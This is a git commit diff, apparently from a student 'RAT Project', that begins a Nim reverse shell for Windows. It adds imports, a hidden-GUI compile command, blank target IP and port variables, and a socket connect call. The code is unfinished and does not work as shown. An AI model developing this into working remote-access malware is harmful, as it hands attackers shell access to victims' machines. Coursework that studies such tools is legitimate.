bdcba00574a04a861a2c5daa1dd8346d0da64b2b
Johnathon Beuter <jbeuter@iastate.edu>
2024-04-25 12:42:23 -0500

    Working on makinga nim payload

--- 436 RAT Project/Nim Testing/reverseShell.nim
+++ 436 RAT Project/Nim Testing/reverseShell.nim
@@ -1,4 +1,18 @@
 import winim
-#import osproc
+import osproc
 
 MessageBox(0, "Hello, world!", "Nim is Powerful", 0)
+
+#nim c -d:mingw --app:gui reverseShell.nim && mv nimshell.exe
+
+var 
+    targetIP = ""
+    targetPort = ""
+
+let 
+    exitMessage = "Exited"
+    changeDirectoryCommand = "cd"
+    defaultDirectory = "C:\\"
+
+try:
+    socket.connect(targetIP, Port(parseInt(targetPort)))
